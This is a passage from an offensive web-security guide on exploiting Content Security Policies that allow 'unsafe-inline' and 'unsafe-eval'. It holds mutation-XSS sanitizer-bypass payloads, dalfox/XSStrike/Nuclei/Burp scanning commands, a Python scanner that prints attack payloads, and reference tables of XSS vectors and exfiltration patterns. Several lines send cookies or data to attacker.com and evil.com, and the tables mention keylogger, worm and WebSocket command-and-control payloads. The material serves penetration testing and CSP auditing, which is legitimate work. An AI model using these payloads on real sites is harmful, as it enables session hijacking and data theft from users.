.target-element { font-family: 'leak'; }
</style>
```

### Mutation XSS (mXSS)

```html [Mutation XSS Payloads]
<!-- Mutation XSS leverages browser HTML parsing differences -->
<!-- These bypass sanitizers but execute with unsafe-inline CSP -->

<!-- DOMPurify bypass (version-specific) -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<math><mtext><img src onerror=alert(1)>
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">

<!-- Namespace confusion -->
<svg><foreignObject><div><style></style><img src=x onerror=alert(1)></div></foreignObject></svg>

<!-- noscript parsing differential -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Template-based mXSS -->
<template><style></style></template><img src=x onerror=alert(1)>

<!-- These work because sanitizers see different DOM tree than browser -->
```

---

## Phase 9 — Detection & Tooling

### Automated Scanning

::tabs

:::tabs-item{icon="i-lucide-scan" label="dalfox"}

```bash [dalfox CSP Bypass Scanning]
# Basic scan with CSP awareness
dalfox url "https://target.com/search?q=test" --csp-bypass

# With WAF evasion
dalfox url "https://target.com/search?q=test" --waf-evasion --csp-bypass

# Pipeline mode
echo "https://target.com/search?q=test" | dalfox pipe --csp-bypass --silence

# With proxy
dalfox url "https://target.com/search?q=test" --csp-bypass --proxy http://127.0.0.1:8080

# Custom payloads
dalfox url "https://target.com/search?q=test" \
  -p '<script>alert(1)</script>' \
  -p '<img src=x onerror=alert(1)>' \
  --csp-bypass

# DOM XSS focused
dalfox url "https://target.com/?q=test" --dom --deep-domxss

# Multiple URLs
cat urls.txt | dalfox pipe --csp-bypass --only-poc --silence | tee results.txt

# With Burp Collaborator
dalfox url "https://target.com/search?q=test" \
  --blind "https://xyz.burpcollaborator.net" --csp-bypass
```

:::

:::tabs-item{icon="i-lucide-scan" label="XSStrike"}

```bash [XSStrike]
# Basic scan
python3 xsstrike.py -u "https://target.com/search?q=test"

# With headers
python3 xsstrike.py -u "https://target.com/search?q=test" \
  --headers "Cookie: session=abc123"

# Crawl mode
python3 xsstrike.py -u "https://target.com/" --crawl -l 3

# Fuzzing mode
python3 xsstrike.py -u "https://target.com/search?q=test" --fuzzer

# Blind XSS
python3 xsstrike.py -u "https://target.com/search?q=test" \
  --blind --blind-url "https://attacker.com/blind"
```

:::

:::tabs-item{icon="i-lucide-scan" label="Nuclei"}

```bash [Nuclei Templates]
# XSS templates
nuclei -u https://target.com -tags xss
nuclei -u https://target.com -tags xss,csp

# DOM XSS detection
nuclei -u https://target.com -tags dom-xss

# JavaScript analysis
nuclei -u https://target.com -tags javascript

# Custom template for unsafe-inline detection
cat << 'EOF' > unsafe-inline-detect.yaml
id: csp-unsafe-inline

info:
  name: CSP unsafe-inline Detection
  severity: high
  tags: csp,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: regex
        part: header
        regex:
          - "(?i)content-security-policy.*'unsafe-inline'"
    extractors:
      - type: regex
        part: header
        regex:
          - "(?i)content-security-policy: (.*)"
EOF

nuclei -u https://target.com -t unsafe-inline-detect.yaml
```

:::

:::tabs-item{icon="i-lucide-scan" label="Burp Suite"}

```text [Burp Suite Workflow]
1. Spider/Crawl target application
2. Check Passive Scanner results for:
   - "CSP: unsafe-inline"
   - "CSP: unsafe-eval"
   - "CSP policy analysis"

3. Install extensions:
   - CSP Auditor
   - CSP Bypass
   - Retire.js
   - JS Link Finder
   - DOM Invader (built into Burp browser)

4. Manual testing via Repeater:
   - Inject inline script payloads
   - Test event handler payloads
   - Test javascript: URI payloads
   - Test eval() injection points

5. Intruder: payload position on injection points
   - Use XSS payload wordlist
   - Monitor for execution indicators

6. DOM Invader:
   - Enable in Burp embedded browser
   - Identify DOM sinks
   - Test postMessage handlers
   - Check for prototype pollution
```

:::

::

### Custom Scanner Script

```python [unsafe_scanner.py]
#!/usr/bin/env python3
"""
CSP unsafe-inline/unsafe-eval Scanner & Payload Generator
"""

import requests
import re
import sys
from urllib.parse import urlencode, quote

class UnsafeCSPScanner:
    def __init__(self, url):
        self.url = url
        self.csp = None
        self.has_unsafe_inline = False
        self.has_unsafe_eval = False
        self.has_nonce = False
        self.has_hash = False
        self.has_strict_dynamic = False
        self.nonce_value = None

    def scan(self):
        print(f"[*] Scanning: {self.url}\n")

        try:
            r = requests.get(self.url, timeout=10, allow_redirects=True)
        except Exception as e:
            print(f"[-] Error: {e}")
            return

        # Extract CSP
        self.csp = r.headers.get('Content-Security-Policy', '')
        csp_ro = r.headers.get('Content-Security-Policy-Report-Only', '')

        if not self.csp:
            meta = re.search(r'<meta[^>]*content-security-policy[^>]*content="([^"]*)"', r.text, re.I)
            if meta:
                self.csp = meta.group(1)

        if not self.csp:
            print("[!] No CSP found — all XSS payloads work!")
            return

        print(f"[*] CSP: {self.csp[:200]}")
        if csp_ro:
            print(f"[*] CSP-RO: {csp_ro[:200]}")
        print()

        # Analyze
        script_src = re.search(r'script-src([^;]*)', self.csp)
        if not script_src:
            script_src = re.search(r'default-src([^;]*)', self.csp)

        if script_src:
            src = script_src.group(1)
            self.has_unsafe_inline = "'unsafe-inline'" in src
            self.has_unsafe_eval = "'unsafe-eval'" in src
            self.has_strict_dynamic = "'strict-dynamic'" in src

            nonce_match = re.search(r"'nonce-([^']+)'", src)
            if nonce_match:
                self.has_nonce = True
                self.nonce_value = nonce_match.group(1)

            self.has_hash = bool(re.search(r"'sha(256|384|512)-", src))

        # Report
        print("[*] Analysis:")
        print(f"  unsafe-inline: {'⚠️  YES' if self.has_unsafe_inline else '✅ NO'}")
        print(f"  unsafe-eval:   {'⚠️  YES' if self.has_unsafe_eval else '✅ NO'}")
        print(f"  strict-dynamic:{'⚡ YES' if self.has_strict_dynamic else '  NO'}")
        print(f"  nonce:         {'🔑 YES ('+self.nonce_value+')' if self.has_nonce else '  NO'}")
        print(f"  hash:          {'#️  YES' if self.has_hash else '  NO'}")
        print()

        # Nonce reuse check
        if self.has_nonce:
            print("[*] Checking nonce reuse...")
            nonces = set()
            for _ in range(5):
                try:
                    r2 = requests.get(self.url, timeout=5)
                    csp2 = r2.headers.get('Content-Security-Policy', '')
                    nm = re.search(r"'nonce-([^']+)'", csp2)
                    if nm:
                        nonces.add(nm.group(1))
                except:
                    pass
            if len(nonces) <= 1:
                print(f"  ⚠️  STATIC NONCE DETECTED: {nonces}")
            else:
                print(f"  ✅ Nonce changes per request ({len(nonces)} unique)")
            print()

        # Generate payloads
        self.generate_payloads()

    def generate_payloads(self):
        print("=" * 60)
        print("[*] Applicable Payloads:\n")

        if self.has_unsafe_inline and self.has_unsafe_eval:
            print("[💀] BOTH unsafe-inline AND unsafe-eval — CSP is useless!")
            print("  <script>alert(document.domain)</script>")
            print("  <img src=x onerror=\"alert(1)\">")
            print("  <svg onload=\"eval('alert(1)')\">")
            print("  <script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>")
            print("  <script>fetch('https://attacker.com/?c='+document.cookie)</script>")
            print()

        elif self.has_unsafe_inline:
            print("[⚠️] unsafe-inline present — inline scripts and event handlers work!")
            print("  <script>alert(document.domain)</script>")
            print("  <img src=x onerror=\"alert(1)\">")
            print("  <svg onload=\"alert(1)\">")
            print("  <input autofocus onfocus=\"alert(1)\">")
            print("  <details open ontoggle=\"alert(1)\">")
            print("  <a href=\"javascript:alert(1)\">click</a>")
            print("  <script>fetch('https://attacker.com/?c='+document.cookie)</script>")
            print()

        elif self.has_unsafe_eval:
            print("[⚠️] unsafe-eval present — eval sinks exploitable!")
            print("  eval('alert(1)')  [if injection into eval context]")
            print("  new Function('alert(1)')()")
            print("  setTimeout('alert(1)',0)")
            print("  [].constructor.constructor('alert(1)')()")
            print("  Requires injection into a script context or DOM-based sink")
            print()

        if self.has_nonce and self.has_unsafe_inline and not self.has_strict_dynamic:
            print("[📝] Nonce + unsafe-inline: CSP Level 1 browsers use unsafe-inline")
            print("  Target legacy browsers for full inline execution")
            print()

        if self.has_strict_dynamic and self.has_unsafe_eval:
            print("[⚡] strict-dynamic + unsafe-eval: eval() still works!")
            print("  Find DOM-based eval sinks in trusted scripts")
            print("  eval(userInput) or new Function(userInput) are exploitable")
            print()

if __name__ == '__main__':
    scanner = UnsafeCSPScanner(sys.argv[1])
    scanner.scan()
```

---

## Quick Reference

### Complete Payload Matrix

::collapsible

| CSP Config | Vector | Payload |
| --- | --- | --- |
| `unsafe-inline` | Inline script | `<script>alert(1)</script>` |
| `unsafe-inline` | img onerror | `<img src=x onerror=alert(1)>` |
| `unsafe-inline` | svg onload | `<svg onload=alert(1)>` |
| `unsafe-inline` | autofocus | `<input autofocus onfocus=alert(1)>` |
| `unsafe-inline` | details | `<details open ontoggle=alert(1)>` |
| `unsafe-inline` | javascript: | `<a href="javascript:alert(1)">` |
| `unsafe-inline` | iframe js | `<iframe src="javascript:alert(1)">` |
| `unsafe-inline` | body onload | `<body onload=alert(1)>` |
| `unsafe-inline` | video error | `<video src=x onerror=alert(1)>` |
| `unsafe-inline` | marquee | `<marquee onstart=alert(1)>` |
| `unsafe-inline` | form action | `<form action="javascript:alert(1)"><input type=submit>` |
| `unsafe-inline` | cookie steal | `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` |
| `unsafe-eval` | eval | `eval('alert(1)')` |
| `unsafe-eval` | Function | `new Function('alert(1)')()` |
| `unsafe-eval` | setTimeout | `setTimeout('alert(1)',0)` |
| `unsafe-eval` | setInterval | `setInterval('alert(1)',0)` |
| `unsafe-eval` | indirect eval | `(0,eval)('alert(1)')` |
| `unsafe-eval` | constructor | `[].constructor.constructor('alert(1)')()` |
| `unsafe-eval` | Reflect | `Reflect.apply(eval,null,['alert(1)'])` |
| `unsafe-eval` | atob+eval | `eval(atob('YWxlcnQoMSk='))` |
| `unsafe-eval` | fromCharCode | `eval(String.fromCharCode(97,108,101,114,116,40,49,41))` |
| Both | full exfil | `<script>eval(atob('ZmV0Y2go...'))</script>` |
| Both | worm | `<script>(function w(){...propagate...})()</script>` |
| Both | reverse shell | `<script>new WebSocket('wss://evil.com/c2')...</script>` |
| Both | keylogger | `<script>document.onkeypress=...</script>` |

::

### Exfiltration Method Matrix

::collapsible

| Method | Requires | Payload Pattern |
| --- | --- | --- |
| `fetch()` | unsafe-inline OR eval sink | `fetch('https://evil.com/?d='+data)` |
| `new Image()` | unsafe-inline OR eval sink | `new Image().src='https://evil.com/?d='+data` |
| `XMLHttpRequest` | unsafe-inline OR eval sink | `var x=new XMLHttpRequest();x.open('GET','https://evil.com/?d='+data);x.send()` |
| `navigator.sendBeacon` | unsafe-inline OR eval sink | `navigator.sendBeacon('https://evil.com',data)` |
| `WebSocket` | unsafe-inline OR eval sink | `new WebSocket('wss://evil.com').onopen=function(){this.send(data)}` |
| `DNS exfil` | unsafe-inline OR eval sink | `new Image().src='https://'+data.substr(0,60)+'.evil.com'` |
| `CSS exfil` | unsafe-inline (style-src) | `input[value^="x"]{background:url('https://evil.com/?v=x')}` |
| `@import` | unsafe-inline (style-src) | `@import url('https://evil.com/next.css')` |
| `window.open` | unsafe-inline | `window.open('https://evil.com/?d='+data)` |
| `location` | unsafe-inline | `location='https://evil.com/?d='+data` |

::

### Event Handler Quick Reference

::collapsible

| Event | Auto-fires? | Tag Example |
| --- | --- | --- |
| `onerror` | ✅ (with invalid src) | `<img src=x onerror=alert(1)>` |
| `onload` | ✅ (SVG) | `<svg onload=alert(1)>` |
| `onfocus` | ✅ (with autofocus) | `<input autofocus onfocus=alert(1)>` |
| `ontoggle` | ✅ (with open attr) | `<details open ontoggle=alert(1)>` |
| `onstart` | ✅ (marquee) | `<marquee onstart=alert(1)>` |
| `onbegin` | ✅ (SVG animate) | `<svg><animate onbegin=alert(1)>` |
| `onloadstart` | ✅ (video) | `<video onloadstart=alert(1)><source>` |
| `onpageshow` | ✅ | `<body onpageshow=alert(1)>` |
| `onanimationstart` | ✅ (with CSS) | `<div style="animation:x" onanimationstart=alert(1)>` |
| `onclick` | ❌ (click needed) | `<div onclick=alert(1)>click</div>` |
| `onmouseover` | ❌ (hover needed) | `<div onmouseover=alert(1)>hover</div>` |
| `onsubmit` | ❌ (submit needed) | `<form onsubmit=alert(1)><input type=submit>` |
| `onkeypress` | ❌ (keystroke) | `<input onkeypress=alert(1) autofocus>` |
| `ondblclick` | ❌ (double click) | `<div ondblclick=alert(1)>dblclick</div>` |
| `oncontextmenu` | ❌ (right click) | `<div oncontextmenu=alert(1)>right-click</div>` |

::

---

## References & Resources

::card-group

::card
---
title: CSP unsafe-inline — MDN
icon: i-simple-icons-mozilla
to: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script
target: _blank
---
Official MDN documentation explaining `unsafe-inline` behavior, its interaction with nonces and hashes, and why it defeats CSP protections.
::

::card
---
title: CSP unsafe-eval — MDN
icon: i-simple-icons-mozilla
to: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_eval_expressions
target: _blank
---
Official documentation on `unsafe-eval`, the JavaScript APIs it enables, and security implications.
::

::card
---
title: PortSwigger — CSP Bypass
icon: i-simple-icons-portswigger
to: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
target: _blank
---
PortSwigger Web Security Academy CSP bypass labs and research, including unsafe-inline and unsafe-eval exploitation techniques.
::

::card
---
title: CSP Is Dead — Google Research
icon: i-simple-icons-google
to: https://research.google/pubs/pub45542/
target: _blank
---
Google research demonstrating that 94.72% of real-world CSPs are bypassable, with unsafe-inline being the most common weakness.
::

::card
---
title: HackTricks — CSP Bypass
icon: i-lucide-book-open
to: https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
target: _blank
---
Extensive collection of CSP bypass techniques with practical examples for unsafe-inline, unsafe-eval, and combined exploitation scenarios.
::

::card
---
title: PayloadsAllTheThings — XSS
icon: i-simple-icons-github
to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
target: _blank
---
Community-maintained XSS payload repository with CSP bypass section covering inline scripts, eval chains, and event handler payloads.
::

::card
---
title: CSP Evaluator
icon: i-simple-icons-google
to: https://csp-evaluator.withgoogle.com/
target: _blank
---
Google's online CSP analysis tool that identifies unsafe-inline and unsafe-eval weaknesses and provides recommendations.
::

::card
---
title: Content Security Policy Reference
icon: i-lucide-shield
to: https://content-security-policy.com/
target: _blank
---
Complete CSP directive reference covering all source values including unsafe-inline, unsafe-eval, unsafe-hashes, and strict-dynamic.
::

::card
---
title: XSS Filter Evasion — OWASP
icon: i-lucide-shield-check
to: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
target: _blank
---
OWASP cheat sheet for XSS filter evasion techniques applicable when unsafe-inline allows event handler and script tag injection.
::

::card
---
title: DOM Clobbering Attacks
icon: i-lucide-bug
to: https://portswigger.net/web-security/dom-based/dom-clobbering
target: _blank
---
DOM clobbering research relevant to unsafe-eval exploitation where clobbered DOM elements flow into eval sinks.
::

::card
---
title: Mutation XSS Research
icon: i-lucide-dna
to: https://cure53.de/fp170.pdf
target: _blank
---
Cure53 research on mutation XSS (mXSS) that bypasses sanitizers but executes when unsafe-inline is present.
::

::card
---
title: CSS Injection Attacks
icon: i-lucide-palette
to: https://x-c3ll.github.io/posts/CSS-Injection-Primitives/
target: _blank
---
CSS injection techniques for data exfiltration when style-src unsafe-inline is present, including attribute extraction via selectors.
::

::